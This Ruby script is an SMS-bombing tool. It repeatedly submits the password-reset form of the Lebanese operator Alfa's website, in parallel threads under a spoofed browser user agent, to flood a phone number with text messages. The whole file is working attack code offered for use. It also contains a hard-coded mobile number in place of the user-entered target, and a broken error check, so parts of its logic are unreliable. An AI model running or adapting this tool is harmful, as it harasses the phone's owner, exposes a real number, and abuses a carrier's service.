#!/usr/bin/env ruby

require 'mechanize'
#require 'logger'


=begin
Class for pretty printing
=end
class Printer
	attr_reader :INFO, :ARROW, :PLUS, :MINUS
	#Nice Colours
	def initialize
		@HEADER   = "\033[95m";
		@OKBLUE   = "\033[94m";
		@OKGREEN  = "\033[92m";
		@WARNING  = "\033[93m";
		@FAIL     = "\033[91m";
		@ENDC     = "\033[0m";
		@INFO     = "#{@HEADER}[#{@OKBLUE}*#{@HEADER}]#{@ENDC}";
		@ARROW    = " #{@OKGREEN}>> #{@ENDC}";
		@PLUS     = "#{@HEADER}[#{@OKGREEN}+#{@HEADER}]#{@ENDC}";
		@MINUS    = "#{@HEADER}[#{@FAIL}-#{@HEADER}]#{@ENDC}";
	end
end


=begin
Spammer class
takes the number and the number of sms to send & the nb of threads as param
spam method to start spamming
=end
class Spammer
	def initialize(number, nb_sms, nb_threads)
		@p = Printer.new
		@number = number
		@nb_sms = nb_sms
		@current_nb_sms = 0
		@nb_threads = nb_threads
		@br = Mechanize.new
		@br.user_agent_alias = 'Mac Safari'
		#@br.log = Logger.new "spam.log"
	end

	def spam
		puts "#{@p.INFO} Starting sending #{@nb_sms}sms to #{@number}"
		threads = []
		(1..@nb_threads).each do |n|
			puts "#{@p.INFO} Starting thread #{n}"
			threads << Thread.new { _thread_spam_handle(n) }
		end
		threads.each { |thr| thr.join }
		puts "#{@p.PLUS} Done"
	end

	def _thread_spam_handle n
		while @current_nb_sms <= @nb_sms
			result = _spam
			return if !result
		end
		puts "#{@p.INFO} Close thread nb##{n}"
	end

	def _spam
		my_sms = (@current_nb_sms += 1)
		return true if my_sms > @nb_sms
		puts "#{@p.INFO} Sending sms number #{my_sms} to #{@number}"
		page = @br.get 'https://www.alfa.com.lb/ResetPassword.aspx'
		reset_form = page.form_with :name => 'aspnetForm'
		reset_form.field_with(
			:name => 'ctl00$ContentPlaceHolder$mobile'
		).value = '71624538'
		s_button = reset_form.button_with(
			:name => 'ctl00$ContentPlaceHolder$submit')
		results = @br.submit(reset_form,s_button)
		if results.body.match('/Invalid Mobile Number/')
			return false
		end
		puts "#{@p.PLUS} Sent sms number #{my_sms} to #{@number}"
		return true
	end

end


def get_int_from_keyboard text
	p = Printer.new
	number = ""
	puts("#{p.INFO} #{text}:")
	until number.match(/^\d+$/) && number.to_i > 0
		print "#{p.ARROW}"
		number = gets
	end
	return number
end


Spammer.new(
	get_int_from_keyboard("Enter the number"),
	get_int_from_keyboard("Enter the times to spam").to_i,
	get_int_from_keyboard("Enter the number of threads").to_i
).spam
